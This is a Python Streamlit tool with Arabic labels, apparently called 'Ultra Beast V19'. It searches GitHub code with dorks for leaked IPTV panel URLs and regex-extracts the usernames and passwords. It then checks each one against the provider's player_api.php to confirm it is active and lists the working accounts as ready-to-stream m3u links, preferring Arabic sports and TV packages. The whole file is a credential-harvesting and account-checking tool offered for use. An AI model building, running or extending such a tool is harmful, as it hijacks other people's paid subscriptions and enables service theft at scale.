import streamlit as st
import requests
import re
from datetime import datetime

# =================================================
# 1. إعدادات الأمان
# =================================================
LOGIN_PASSWORD = "BEAST_V19_POWER" 

if "password_correct" not in st.session_state:
    st.session_state.password_correct = False

if not st.session_state.password_correct:
    st.markdown("<h2 style='text-align: center; color:#00ff41;'>🌪️ Ultra Beast V19 POWER</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور:", type="password")
    if st.button("دخول"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ خطأ!")
    st.stop()

# =================================================
# 2. الواجهة والستايل
# =================================================
st.set_page_config(page_title="Ultra Beast V19", layout="wide")

st.markdown("""
<style>
    .stApp { background-color: #0c0e12; color: white; }
    .card {
        background: #1a1d23; border: 1px solid #2d323b;
        border-right: 5px solid #00ff41; padding: 15px;
        border-radius: 8px; margin-bottom: 10px;
    }
    .arabic-badge { background: #ff4b4b; color: white; padding: 2px 5px; border-radius: 4px; font-size: 10px; }
</style>
""", unsafe_allow_html=True)

if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
if 'seen_urls' not in st.session_state: st.session_state.seen_urls = set()

# =================================================
# 3. محرك الفحص (التحقق من المحتوى العربي)
# =================================================

def check_account(host, user, pw):
    unique_key = f"{host}|{user}"
    if unique_key in st.session_state.seen_urls: return None
    st.session_state.seen_urls.add(unique_key)

    try:
        # 1. الفحص الأساسي للصلاحية
        api_url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(api_url, timeout=4).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp = datetime.fromtimestamp(int(info['exp_date'])).strftime('%Y-%m-%d') if info.get('exp_date') else "Unlimited"
            
            # 2. فحص المحتوى العربي (اختياري وسريع)
            is_arabic = False
            try:
                cat_res = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=3).text.upper()
                arabic_keywords = ["ARABIC", "BEIN", "OSN", "SSC", "SHAHID", "NILESAT", "MAGHREB", "EGYPT"]
                if any(k in cat_res for k in arabic_keywords):
                    is_arabic = True
            except: pass

            return {
                "host": host, "user": user, "pass": pw, 
                "exp": exp, "conn": f"{info.get('active_cons')}/{info.get('max_connections')}",
                "is_arabic": is_arabic,
                "m3u": f"{host}/get.php?username={user}&password={pw}&type=m3u_plus&output=ts"
            }
    except: return None

# =================================================
# 4. لوحة التحكم
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V19")
    token = st.text_input("GitHub Token:", type="password", help="ضع توكن صالح لجلب النتائج")
    
    st.divider()
    filter_ar = st.checkbox("عرض السيرفرات العربية فقط", value=False)
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🚀 ابدأ"): st.session_state.is_hunting = True
    with col2:
        if st.button("🛑 توقف"): st.session_state.is_hunting = False

    st.metric("🔍 تم فحصه", st.session_state.checked_count)
    st.metric("💎 النتائج", len(st.session_state.results))

# =================================================
# 5. منطقة النتائج
# =================================================
st.subheader("📡 نتائج الصيد الذكي")
res_container = st.empty()

def update_ui():
    with res_container.container():
        display_list = st.session_state.results
        if filter_ar:
            display_list = [i for i in display_list if i['is_arabic']]
            
        for item in display_list:
            ar_tag = '<span class="arabic-badge">ARABIC ✅</span>' if item['is_arabic'] else ''
            st.markdown(f"""
            <div class="card">
                <div style="display:flex; justify-content:space-between;">
                    <b style="color:#00ff41;">{item['host']}</b>
                    {ar_tag}
                </div>
                <div style="font-size:13px; margin-top:5px;">
                    USER: {item['user']} | PASS: {item['pass']} | EXP: {item['exp']}
                </div>
                <code style="font-size:10px; color:#888;">{item['m3u']}</code>
            </div>
            """, unsafe_allow_html=True)

if st.session_state.is_hunting:
    if not token:
        st.error("⚠️ يرجى إدخال GitHub Token!")
        st.session_state.is_hunting = False
    else:
        headers = {'Authorization': f'token {token}'}
        # دوركات قوية وشاملة (تجلب نتائج كثيرة)
        dorks = [
            '"player_api.php" username password extension:txt',
            '"get.php?username=" password extension:m3u',
            'filename:iptv.txt "http"',
            'filename:beinsports.txt'
        ]

        for dork in dorks:
            if not st.session_state.is_hunting: break
            for page in range(1, 6):
                if not st.session_state.is_hunting: break
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
                    res = requests.get(search_url, headers=headers).json()
                    
                    if 'items' in res:
                        for item in res['items']:
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=3).text
                            matches = re.findall(r"(https?://[\w\.-]+(?::\d+)?)/[a-zA-Z\._-]+\?username=([\w\.-]+)&password=([\w\.-]+)", content)
                            
                            for m in matches:
                                st.session_state.checked_count += 1
                                found = check_account(m[0], m[1], m[2])
                                if found:
                                    st.session_state.results.insert(0, found)
                                    update_ui()
                                    st.toast("🎯 تم صيد حساب جديد!")
                    elif 'message' in res: # في حال انتهى حد التوكن
                        st.warning(f"GitHub: {res['message']}")
                        st.session_state.is_hunting = False
                        break
                except: continue
        st.session_state.is_hunting = False
        st.success("✅ انتهى البحث.")
else:
    update_ui()
